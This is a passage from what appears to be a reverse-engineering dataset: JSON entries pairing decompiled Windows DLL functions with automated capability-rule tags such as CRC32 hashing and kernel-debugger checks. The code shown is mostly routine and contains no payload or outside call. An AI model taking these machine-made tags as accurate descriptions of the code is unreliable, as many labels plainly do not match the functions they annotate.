        "decompiled_code": "\nulong * fcn.18001c50c(ulong *arg1, ulong *arg2)\n\n{\n    ulong uVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    \n    iVar5 = arg1[1];\n    uVar1 = *arg1;\n    iVar4 = iVar5;\n    if (iVar5 != 0) {\n        do {\n            iVar3 = iVar4;\n            uVar2 = fcn.18001bfac(*(iVar3 + 0x10));\n            iVar4 = iVar3;\n            if ((uVar2 >> 0x11 & 1) != 0) break;\n            iVar4 = *(iVar3 + 8);\n            iVar5 = iVar3;\n        } while (iVar4 != 0);\n        if (iVar4 != 0) {\n            arg2[1] = iVar4;\n            goto code_r0x00018001c55d;\n        }\n    }\n    arg2[1] = iVar5;\ncode_r0x00018001c55d:\n    *arg2 = uVar1;\n    return arg2;\n}\n",
        "token_count": 254
    },
    "18001e04": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nint32_t fcn.18001e04c(int64_t arg1)\n\n{\n    if ((*(arg1 + 0xb0) >> 0xc & 1) != 0) {\n        return (-((*(arg1 + 0xac) & 1) != 0) & 0xfffffff0) + 0x20;\n    }\n    return 0;\n}\n",
        "token_count": 85
    },
    "18001e06": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid fcn.18001e06c(int64_t arg1, ulong arg2)\n\n{\n    ulong *puVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int64_t *apiStackX8 [4];\n    \n    if ((*(arg1 + 0xb0) >> 0xc & 1) != 0) {\n        if ((*(arg1 + 0xac) & 1) != (arg2 != 0)) {\n            apiStackX8[0] = NULL;\n            *(arg1 + 0xac) = *(arg1 + 0xac) ^ 1;\n            puVar1 = *(arg1 + 0x80);\n            if (puVar1 == NULL) {\n                fcn.180012514();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            iVar3 = (***puVar1)(puVar1, 0x180056198, apiStackX8);\n            if (-1 < iVar3) {\n                (**(*apiStackX8[0] + 0x28))(apiStackX8[0], 0xfffffd37);\n                (**(*apiStackX8[0] + 0x10))();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 281
    },
    "18001f3d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid fcn.18001f3dc(ulong *arg1, ulong arg2, ulong noname_2, ulong arg4)\n\n{\n    code *pcVar1;\n    uchar in_stack_00000028;\n    uchar in_stack_00000030;\n    uint in_stack_00000038;\n    ulong in_stack_00000040;\n    int64_t in_stack_00000048;\n    int64_t in_stack_00000050;\n    ulong in_stack_00000058;\n    \n    if (arg1 == NULL) {\n        fcn.180001214(0x80004005);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    *arg1 = arg2;\n    *(arg1 + 0x54) = noname_2;\n    *(arg1 + 10) = 0;\n    arg1[2] = 0;\n    arg1[3] = 0;\n    arg1[4] = 0;\n    *(arg1 + 0x3c) = noname_2 >> 0xe & 1;\n    arg1[6] = 0;\n    arg1[5] = in_stack_00000058;\n    arg1[9] = arg4;\n    *(arg1 + 8) = in_stack_00000038;\n    *(arg1 + 7) = 1;\n    *(arg1 + 0x56) = in_stack_00000028;\n    *(arg1 + 0x57) = in_stack_00000030;\n    arg1[1] = in_stack_00000040;\n    if (in_stack_00000048 != 0) {\n        *(arg1 + 7) = 3;\n        arg1[2] = in_stack_00000048;\n    }\n    if (in_stack_00000050 != 0) {\n        *(arg1 + 7) = *(arg1 + 7) | 4;\n        arg1[3] = in_stack_00000050;\n    }\n    return;\n}\n",
        "token_count": 448
    },
    "18002890": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint64_t fcn.18002890c(int64_t lpCriticalSection)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    uint8_t *puVar4;\n    uint64_t uVar5;\n    ulong uVar6;\n    int64_t iVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    \n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(lpCriticalSection + 0x28);\n    iVar2 = *(lpCriticalSection + 4);\n    uVar8 = *(lpCriticalSection + 8);\n    if ((iVar2 <= uVar8) || ((*(*(lpCriticalSection + 0x10) + uVar8 * 0x10) & 1) != 0)) {\n        uVar8 = 1;\n        iVar7 = 1;\n        if (1 < iVar2) {\n            puVar4 = *(lpCriticalSection + 0x10);\n            do {\n                puVar4 = puVar4 + 0x10;\n                if ((*puVar4 & 1) == 0) break;\n                iVar7 = iVar7 + 1;\n                uVar8 = uVar8 + 1;\n            } while (iVar7 < iVar2);\n        }\n        if (iVar2 <= uVar8) {\n            uVar9 = iVar2 + 0x20;\n            if (*(lpCriticalSection + 0x10) == 0) {\n                if (0xffffffff < uVar9 << 4) {\n                    fcn.180001214(0x80070057);\n                    pcVar3 = swi(3);\n                    uVar5 = (*pcVar3)();\n                    return uVar5;\n                }\n                iVar7 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(2);\n            }\n            else {\n                uVar6 = (*_sym.imp.KERNEL32.dll_GlobalHandle)();\n                (*_sym.imp.KERNEL32.dll_GlobalUnlock)(uVar6);\n                if (0xffffffff < uVar9 << 4) {\n                    fcn.180001214(0x80070057);\n                    pcVar3 = swi(3);\n                    uVar5 = (*pcVar3)();\n                    return uVar5;\n                }\n                iVar7 = (*_sym.imp.KERNEL32.dll_GlobalReAlloc)(uVar6, uVar9 << 4 & 0xffffffff, 0x2002);\n            }\n            if (iVar7 == 0) {\n                if (*(lpCriticalSection + 0x10) != 0) {\n                    uVar6 = (*_sym.imp.KERNEL32.dll_GlobalHandle)();\n                    (*_sym.imp.KERNEL32.dll_GlobalLock)(uVar6);\n                }\n                (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(lpCriticalSection + 0x28);\n                fcn.1800124cc();\n                pcVar3 = swi(3);\n                uVar5 = (*pcVar3)();\n                return uVar5;\n            }\n            iVar7 = (*_sym.imp.KERNEL32.dll_GlobalLock)(iVar7);\n            fcn.180033c90(*(lpCriticalSection + 4) * 0x10 + iVar7, 0, uVar9 - *(lpCriticalSection + 4) << 4);\n            *(lpCriticalSection + 4) = uVar9;\n            *(lpCriticalSection + 0x10) = iVar7;\n        }\n    }\n    if (*(lpCriticalSection + 0xc) <= uVar8) {\n        *(lpCriticalSection + 0xc) = uVar8 + 1;\n    }\n    puVar1 = *(lpCriticalSection + 0x10) + uVar8 * 0x10;\n    *puVar1 = *puVar1 | 1;\n    *(lpCriticalSection + 8) = uVar8 + 1;\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(lpCriticalSection + 0x28);\n    return uVar8;\n}\n",
        "token_count": 847
    },
    "18002a2d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint64_t fcn.18002a2d0(int64_t arg1, int64_t arg2, ulong arg3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    ulong uVar3;\n    int64_t iVar4;\n    \n    if (arg2 == 0) {\ncode_r0x00018002a396:\n        uVar3 = (*_sym.imp.USER32.dll_GetTopWindow)(*(arg1 + 0x40));\n        iVar4 = fcn.180017c38(uVar3);\n        if (iVar4 == 0) {\n            return arg1;\n        }\n    }\n    else {\n        uVar3 = *(arg2 + 0x40);\n        while( true ) {\n            uVar3 = (*_sym.imp.USER32.dll_GetWindow)(uVar3, 2);\n            iVar4 = fcn.180017c38(uVar3);\n            if (iVar4 != 0) break;\n            uVar3 = (*_sym.imp.USER32.dll_GetParent)(*(arg2 + 0x40));\n            uVar3 = fcn.180017c38(uVar3);\n            arg2 = fcn.18002a254(arg1, uVar3);\n            if ((arg2 == 0) || (arg2 == arg1)) goto code_r0x00018002a396;\n            uVar3 = *(arg2 + 0x40);\n        }\n        uVar3 = (*_sym.imp.USER32.dll_GetWindow)(*(arg2 + 0x40), 2);\n        iVar4 = fcn.180017c38(uVar3);\n    }\n    uVar1 = (*_sym.imp.USER32.dll_GetWindowLongW)(*(iVar4 + 0x40));\n    if ((uVar1 >> 0x10 & 1) != 0) {\n        if ((((arg3 & 1) == 0) || (iVar2 = (*_sym.imp.USER32.dll_IsWindowVisible)(*(iVar4 + 0x40)),  iVar2 != 0)) &&\n           (((arg3 & 2) == 0 || (iVar2 = fcn.18001bea8(iVar4),  iVar2 != 0)))) {\n            arg1 = iVar4;\n            iVar4 = 0;\n        }\n        iVar4 = fcn.18002a2d0(arg1, iVar4, arg3);\n    }\n    return iVar4;\n}\n",
        "token_count": 529
    },
    "18002b96": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.18002b96c(int64_t arg1, uint32_t *arg2)\n\n{\n    uint16_t uVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    uchar auStack120 [32];\n    uchar auStack88 [64];\n    uint64_t uStack24;\n    \n    uStack24 = *0x180067ce0 ^ auStack120;\n    if (arg2 != NULL) {\n        if ((*(arg1 + 0x20) & 1) == 0) {\n            fcn.18002b424(4, *(arg1 + 0x18));\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        uVar4 = *(arg1 + 0x38) + 2;\n        if (*(arg1 + 0x40) <= uVar4 && uVar4 != *(arg1 + 0x40)) {\n            fcn.18002b7a4(arg1, (*(arg1 + 0x38) - *(arg1 + 0x40)) + 2);\n        }\n        uVar1 = **(arg1 + 0x38);\n        *(arg1 + 0x38) = *(arg1 + 0x38) + 1;\n        *arg2 = uVar1;\n        if ((*(arg1 + 0x20) & 1) == 0) {\n            fcn.18002b424(4, *(arg1 + 0x18));\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        uVar4 = *(arg1 + 0x38) + 2;\n        if (*(arg1 + 0x40) <= uVar4 && uVar4 != *(arg1 + 0x40)) {\n            fcn.18002b7a4(arg1, (*(arg1 + 0x38) - *(arg1 + 0x40)) + 2);\n        }\n        uVar1 = **(arg1 + 0x38);\n        *(arg1 + 0x38) = *(arg1 + 0x38) + 1;\n        if ((uVar1 < 0x40) && (uVar3 = fcn.18002b508(arg1, auStack88, uVar1),  uVar3 == uVar1)) {\n            auStack88[uVar1] = 0;\n            fcn.18002b904(auStack88);\n        }\n    }\n    fcn.180032ea0(uStack24 ^ auStack120);\n    return;\n}\n",
        "token_count": 584
    },
    "18002bbe": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.18002bbec(int64_t arg1, uint64_t arg2)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    \n    if (arg2 < 0xffff) {\n        if ((~*(arg1 + 0x20) & 1) == 0) {\n            fcn.18002b424(2, *(arg1 + 0x18));\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        uVar2 = *(arg1 + 0x38) + 2;\n        if (*(arg1 + 0x40) <= uVar2 && uVar2 != *(arg1 + 0x40)) {\n            fcn.18002b6e4(arg1);\n        }\n        **(arg1 + 0x38) = arg2;\n        *(arg1 + 0x38) = *(arg1 + 0x38) + 2;\n    }\n    else {\n        if ((~*(arg1 + 0x20) & 1) == 0) {\n            fcn.18002b424(2, *(arg1 + 0x18));\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        uVar2 = *(arg1 + 0x38) + 2;\n        if (*(arg1 + 0x40) <= uVar2 && uVar2 != *(arg1 + 0x40)) {\n            fcn.18002b6e4(arg1);\n        }\n        **(arg1 + 0x38) = 0xffff;\n        *(arg1 + 0x38) = *(arg1 + 0x38) + 2;\n        if (arg2 < 0xffffffff) {\n            if ((~*(arg1 + 0x20) & 1) == 0) {\n                fcn.18002b424(2, *(arg1 + 0x18));\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n            uVar2 = *(arg1 + 0x38) + 4;\n            if (*(arg1 + 0x40) <= uVar2 && uVar2 != *(arg1 + 0x40)) {\n                fcn.18002b6e4(arg1);\n            }\n            **(arg1 + 0x38) = arg2;\n            *(arg1 + 0x38) = *(arg1 + 0x38) + 4;\n        }\n        else {\n            if ((~*(arg1 + 0x20) & 1) == 0) {\n                fcn.18002b424(2, *(arg1 + 0x18));\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n            uVar2 = *(arg1 + 0x38) + 4;\n            if (*(arg1 + 0x40) <= uVar2 && uVar2 != *(arg1 + 0x40)) {\n                fcn.18002b6e4(arg1);\n            }\n            **(arg1 + 0x38) = 0xffffffff;\n            *(arg1 + 0x38) = *(arg1 + 0x38) + 4;\n            if ((~*(arg1 + 0x20) & 1) == 0) {\n                fcn.18002b424(2, *(arg1 + 0x18));\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n            uVar2 = *(arg1 + 0x38) + 8;\n            if (*(arg1 + 0x40) <= uVar2 && uVar2 != *(arg1 + 0x40)) {\n                fcn.18002b6e4(arg1);\n            }\n            **(arg1 + 0x38) = arg2;\n            *(arg1 + 0x38) = *(arg1 + 0x38) + 8;\n        }\n    }\n    return;\n}\n",
        "token_count": 905
    },
    "18002be2": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.18002be20(int64_t *lpString, int64_t arg2)\n\n{\n    int64_t *piVar1;\n    ushort uVar2;\n    int64_t arg3;\n    code *pcVar3;\n    uint16_t uVar4;\n    int32_t iVar5;\n    uint64_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    \n    uVar4 = (*_sym.imp.KERNEL32.dll_lstrlenA)(*lpString);\n    uVar2 = *(lpString + 0xc);\n    if ((~*(arg2 + 0x20) & 1) == 0) {\n        fcn.18002b424(2, *(arg2 + 0x18));\n        pcVar3 = swi(3);\n        (*pcVar3)();\n        return;\n    }\n    uVar6 = *(arg2 + 0x38) + 2;\n    if (*(arg2 + 0x40) <= uVar6 && uVar6 != *(arg2 + 0x40)) {\n        fcn.18002b6e4(arg2);\n    }\n    **(arg2 + 0x38) = uVar2;\n    *(arg2 + 0x38) = *(arg2 + 0x38) + 2;\n    if ((~*(arg2 + 0x20) & 1) == 0) {\n        fcn.18002b424(2, *(arg2 + 0x18));\n        pcVar3 = swi(3);\n        (*pcVar3)();\n        return;\n    }\n    uVar6 = *(arg2 + 0x38) + 2;\n    if (*(arg2 + 0x40) <= uVar6 && uVar6 != *(arg2 + 0x40)) {\n        fcn.18002b6e4(arg2);\n    }\n    uVar7 = uVar4;\n    **(arg2 + 0x38) = uVar4;\n    *(arg2 + 0x38) = *(arg2 + 0x38) + 2;\n    arg3 = *lpString;\n    if ((uVar7 != 0) && (arg3 != 0)) {\n        if ((~*(arg2 + 0x20) & 1) == 0) {\n            fcn.18002b424(2, *(arg2 + 0x18));\n            pcVar3 = swi(3);\n            (*pcVar3)();\n            return;\n        }\n        piVar1 = arg2 + 0x40;\n        uVar8 = *piVar1 - *(arg2 + 0x38);\n        if (uVar7 < uVar8) {\n            uVar8 = uVar7;\n        }\n        uVar6 = uVar8;\n        iVar5 = fcn.180034220(*(arg2 + 0x38), *piVar1 - *(arg2 + 0x38), arg3, uVar6);\n        if (iVar5 != 0) {\n            if (iVar5 == 0xc) {\n                fcn.1800124cc();\n                pcVar3 = swi(3);\n                (*pcVar3)();\n                return;\n            }\n            if ((iVar5 == 0x16) || (iVar5 == 0x22)) {\n                fcn.180012514();\n                pcVar3 = swi(3);\n                (*pcVar3)();\n                return;\n            }\n            if (iVar5 != 0x50) {\n                fcn.180012514();\n                pcVar3 = swi(3);\n                (*pcVar3)();\n                return;\n            }\n        }\n        *(arg2 + 0x38) = *(arg2 + 0x38) + uVar6;\n        uVar7 = uVar7 - uVar8;\n        if (uVar7 != 0) {\n            fcn.18002b6e4(arg2);\n            uVar8 = uVar7 - uVar7 % *(arg2 + 0x28);\n            (**(**(arg2 + 0x30) + 0x70))(*(arg2 + 0x30), arg3 + uVar6, uVar8);\n            uVar7 = uVar7 - uVar8;\n            if (*(arg2 + 0xc) != 0) {\n                (**(**(arg2 + 0x30) + 0xa0))(*(arg2 + 0x30), 1, *(arg2 + 0x28), arg2 + 0x48, piVar1);\n                *(arg2 + 0x38) = *(arg2 + 0x48);\n            }\n            if (*(arg2 + 0x28) <= uVar7) {\n                fcn.180012514();\n                pcVar3 = swi(3);\n                (*pcVar3)();\n                return;\n            }\n            if (*(arg2 + 0x38) != *(arg2 + 0x48)) {\n                fcn.180012514();\n                pcVar3 = swi(3);\n                (*pcVar3)();\n                return;\n            }\n            iVar5 = fcn.180034220(*(arg2 + 0x38), uVar7, arg3 + uVar6 + uVar8, uVar7);\n            if (iVar5 != 0) {\n                if (iVar5 == 0xc) {\n                    fcn.1800124cc();\n                    pcVar3 = swi(3);\n                    (*pcVar3)();\n                    return;\n                }\n                if ((iVar5 == 0x16) || (iVar5 == 0x22)) {\n                    fcn.180012514();\n                    pcVar3 = swi(3);\n                    (*pcVar3)();\n                    return;\n                }\n                if (iVar5 != 0x50) {\n                    fcn.180012514();\n                    pcVar3 = swi(3);\n                    (*pcVar3)();\n                    return;\n                }\n            }\n            *(arg2 + 0x38) = *(arg2 + 0x38) + uVar7;\n        }\n    }\n    return;\n}\n",
        "token_count": 1341
    },
    "18003175": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.18003175c(int64_t arg1, int64_t arg2)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    uint64_t uVar5;\n    uint64_t *puVar6;\n    \n    if (arg2 == 0) {\n        fcn.18002b424(6, *(arg1 + 0x18));\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    if ((~*(arg1 + 0x20) & 1) == 0) {\n        fcn.18002b424(1, *(arg1 + 0x18));\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    if (*(arg2 + 0xc) == 0xffff) {\n        fcn.1800124f0();\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    fcn.1800315cc(arg1, 0);\n    puVar4 = fcn.18002d358(*(arg1 + 0x58), arg2);\n    uVar1 = *puVar4;\n    uVar3 = ~*(arg1 + 0x20);\n    if (uVar1 == 0) {\n        if ((uVar3 & 1) == 0) {\n            fcn.18002b424(2, *(arg1 + 0x18));\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        uVar5 = *(arg1 + 0x38) + 2;\n        if (*(arg1 + 0x40) <= uVar5 && uVar5 != *(arg1 + 0x40)) {\n            fcn.18002b6e4(arg1);\n        }\n        **(arg1 + 0x38) = 0xffff;\n        *(arg1 + 0x38) = *(arg1 + 0x38) + 2;\n        fcn.18002be20(arg2, arg1);\n        fcn.180031010(arg1);\n        uVar1 = *(arg1 + 0x50);\n        puVar6 = fcn.18002d358(*(arg1 + 0x58), arg2);\n        *puVar6 = uVar1;\n        *(arg1 + 0x50) = *(arg1 + 0x50) + 1;\n    }\n    else if (uVar1 < 0x7fff) {\n        if ((uVar3 & 1) == 0) {\n            fcn.18002b424(2, *(arg1 + 0x18));\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        uVar5 = *(arg1 + 0x38) + 2;\n        if (*(arg1 + 0x40) <= uVar5 && uVar5 != *(arg1 + 0x40)) {\n            fcn.18002b6e4(arg1);\n        }\n        **(arg1 + 0x38) = uVar1 | 0x8000;\n        *(arg1 + 0x38) = *(arg1 + 0x38) + 2;\n    }\n    else {\n        if ((uVar3 & 1) == 0) {\n            fcn.18002b424(2, *(arg1 + 0x18));\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        uVar5 = *(arg1 + 0x38) + 2;\n        if (*(arg1 + 0x40) <= uVar5 && uVar5 != *(arg1 + 0x40)) {\n            fcn.18002b6e4(arg1);\n        }\n        **(arg1 + 0x38) = 0x7fff;\n        *(arg1 + 0x38) = *(arg1 + 0x38) + 2;\n        if ((~*(arg1 + 0x20) & 1) == 0) {\n            fcn.18002b424(2, *(arg1 + 0x18));\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        uVar5 = *(arg1 + 0x38) + 4;\n        if (*(arg1 + 0x40) <= uVar5 && uVar5 != *(arg1 + 0x40)) {\n            fcn.18002b6e4(arg1);\n        }\n        **(arg1 + 0x38) = uVar1 | 0x80000000;\n        *(arg1 + 0x38) = *(arg1 + 0x38) + 4;\n    }\n    return;\n}\n",
        "token_count": 1089
    },
    "180031c8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.180031c80(int64_t arg1, int64_t *arg2)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    uint64_t uVar3;\n    uint32_t *puVar4;\n    ulong arg2_00;\n    uint64_t *puVar5;\n    \n    if ((~*(arg1 + 0x20) & 1) == 0) {\n        fcn.18002b424(2, *(arg1 + 0x18));\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    fcn.1800315cc(arg1, 0);\n    if (arg2 == NULL) {\n        if ((~*(arg1 + 0x20) & 1) == 0) {\n            fcn.18002b424(2, *(arg1 + 0x18));\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        uVar3 = *(arg1 + 0x38) + 2;\n        if (*(arg1 + 0x40) <= uVar3 && uVar3 != *(arg1 + 0x40)) {\n            fcn.18002b6e4(arg1);\n        }\n        **(arg1 + 0x38) = 0;\n    }\n    else {\n        puVar4 = fcn.18002d358(*(arg1 + 0x58), arg2);\n        uVar1 = *puVar4;\n        if (uVar1 == 0) {\n            arg2_00 = (***arg2)(arg2);\n            fcn.18003175c(arg1, arg2_00);\n            fcn.180031010(arg1);\n            uVar1 = *(arg1 + 0x50);\n            puVar5 = fcn.18002d358(*(arg1 + 0x58), arg2);\n            *puVar5 = uVar1;\n            *(arg1 + 0x50) = *(arg1 + 0x50) + 1;\n            (**(*arg2 + 0x10))(arg2, arg1);\n            return;\n        }\n        if (0x7ffe < uVar1) {\n            if ((~*(arg1 + 0x20) & 1) == 0) {\n                fcn.18002b424(2, *(arg1 + 0x18));\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            uVar3 = *(arg1 + 0x38) + 2;\n            if (*(arg1 + 0x40) <= uVar3 && uVar3 != *(arg1 + 0x40)) {\n                fcn.18002b6e4(arg1);\n            }\n            **(arg1 + 0x38) = 0x7fff;\n            *(arg1 + 0x38) = *(arg1 + 0x38) + 2;\n            if ((~*(arg1 + 0x20) & 1) != 0) {\n                uVar3 = *(arg1 + 0x38) + 4;\n                if (*(arg1 + 0x40) <= uVar3 && uVar3 != *(arg1 + 0x40)) {\n                    fcn.18002b6e4(arg1);\n                }\n                **(arg1 + 0x38) = uVar1;\n                *(arg1 + 0x38) = *(arg1 + 0x38) + 4;\n                return;\n            }\n            fcn.18002b424(2, *(arg1 + 0x18));\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        if ((~*(arg1 + 0x20) & 1) == 0) {\n            fcn.18002b424(2, *(arg1 + 0x18));\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        uVar3 = *(arg1 + 0x38) + 2;\n        if (*(arg1 + 0x40) <= uVar3 && uVar3 != *(arg1 + 0x40)) {\n            fcn.18002b6e4(arg1);\n        }\n        **(arg1 + 0x38) = uVar1;\n    }\n    *(arg1 + 0x38) = *(arg1 + 0x38) + 2;\n    return;\n}\n",
        "token_count": 1007
    },
    "180041c3": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong fcn.180041c30(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    ulong uVar5;\n    code *pcVar6;\n    code *pcVar7;\n    int64_t iVar8;\n    uchar auStackX32 [8];\n    uchar auStack56 [8];\n    uint8_t uStack48;\n    \n    iVar2 = fcn.180036804();\n    iVar8 = 0;\n    if (*0x18006e228 == 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"USER32.DLL\");\n        if (iVar3 == 0) {\n            return 0;\n        }\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, \"MessageBoxA\");\n        if (iVar4 == 0) {\n            return 0;\n        }\n        *0x18006e228 = sub.KERNEL32.dll_EncodePointer(iVar4);\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, 0x180055770);\n        *0x18006e230 = sub.KERNEL32.dll_EncodePointer(uVar5);\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, 0x180055758);\n        *0x18006e238 = sub.KERNEL32.dll_EncodePointer(uVar5);\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, \"GetUserObjectInformationA\");\n        *0x18006e248 = sub.KERNEL32.dll_EncodePointer(uVar5);\n        if (*0x18006e248 != 0) {\n            uVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, \"GetProcessWindowStation\");\n            *0x18006e240 = sub.KERNEL32.dll_EncodePointer(uVar5);\n        }\n    }\n    if ((*0x18006e240 != iVar2) && (*0x18006e248 != iVar2)) {\n        pcVar6 = sub.KERNEL32.dll_DecodePointer(*0x18006e240);\n        pcVar7 = sub.KERNEL32.dll_DecodePointer(*0x18006e248);\n        if (((pcVar6 != NULL) && (pcVar7 != NULL)) &&\n           (((iVar3 = (*pcVar6)(),  iVar3 == 0 || (iVar1 = (*pcVar7)(iVar3, 1, auStack56, 0xc, auStackX32),  iVar1 == 0)\n             ) || ((uStack48 & 1) == 0)))) {\n            arg3._0_4_ = arg3 | 0x200000;\n            goto code_r0x000180041dea;\n        }\n    }\n    if ((((*0x18006e230 != iVar2) && (pcVar6 = sub.KERNEL32.dll_DecodePointer(),  pcVar6 != NULL)) &&\n        (iVar8 = (*pcVar6)(),  iVar8 != 0)) &&\n       ((*0x18006e238 != iVar2 && (pcVar6 = sub.KERNEL32.dll_DecodePointer(),  pcVar6 != NULL)))) {\n        iVar8 = (*pcVar6)(iVar8);\n    }\ncode_r0x000180041dea:\n    pcVar6 = sub.KERNEL32.dll_DecodePointer(*0x18006e228);\n    if (pcVar6 == NULL) {\n        return 0;\n    }\n    uVar5 = (*pcVar6)(iVar8, arg1, arg2, arg3);\n    return uVar5;\n}\n",
        "token_count": 807
    },
    "18000f5a": {
        "rules": [
            "check for kernel debugger via shared user data structure/3e5f0b53f7994283abe93631eebb775f"
        ],
        "decompiled_code": "\nuint64_t fcn.18000f5a4(uint32_t *arg1)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    int16_t *piVar3;\n    uint32_t uVar4;\n    bool bVar5;\n    \n    uVar4 = *arg1;\n    bVar5 = *(arg1 + 2) == -1;\n    if (bVar5) {\n        uVar4 = arg1[3];\n        piVar3 = arg1 + 0x1a;\n    }\n    else {\n        piVar3 = arg1 + 0x12;\n    }\n    if (*piVar3 == -1) {\n        piVar3 = piVar3 + 2;\n    }\n    else {\n        do {\n            iVar1 = *piVar3;\n            piVar3 = piVar3 + 1;\n        } while (iVar1 != 0);\n    }\n    if (*piVar3 == -1) {\n        piVar3 = piVar3 + 2;\n    }\n    else {\n        do {\n            iVar1 = *piVar3;\n            piVar3 = piVar3 + 1;\n        } while (iVar1 != 0);\n    }\n    do {\n        piVar2 = piVar3;\n        piVar3 = piVar2 + 1;\n    } while (*piVar2 != 0);\n    if ((uVar4 & 0x40) != 0) {\n        piVar3 = piVar2 + (-bVar5 & 2) + 2;\n        do {\n            iVar1 = *piVar3;\n            piVar3 = piVar3 + 1;\n        } while (iVar1 != 0);\n    }\n    return piVar3 + 3U & 0xfffffffffffffffc;\n}\n",
        "token_count": 392
    },
    "18001dbe": {
        "rules": [
            "check for kernel debugger via shared user data structure/3e5f0b53f7994283abe93631eebb775f"
        ],
        "decompiled_code": "\nuint fcn.18001dbec(int64_t arg1, int64_t arg2, int64_t arg3, ulong arg4)\n\n{\n    uint uVar1;\n    ulong *puVar2;\n    int64_t *in_stack_00000028;\n    \n    if (((arg1 == 0) || (arg3 == 0)) || (in_stack_00000028 == NULL)) {\n        uVar1 = 0x80004005;\n    }\n    else {\n        uVar1 = (**(*in_stack_00000028 + 0x20))\n                          (in_stack_00000028, (-(*(arg1 + 0x40) != 0) & 2U) + 2, arg2, arg1, arg4, arg3, 0);\n        if (arg2 != 0) {\n            puVar2 = arg1 + 0x28;\n            do {\n                fcn.1800096a4(*puVar2);\n                puVar2 = puVar2 + 0xb;\n                arg2 = arg2 + -1;\n            } while (arg2 != 0);\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 254
    },
    "18002cab": {
        "rules": [
            "check for kernel debugger via shared user data structure/3e5f0b53f7994283abe93631eebb775f"
        ],
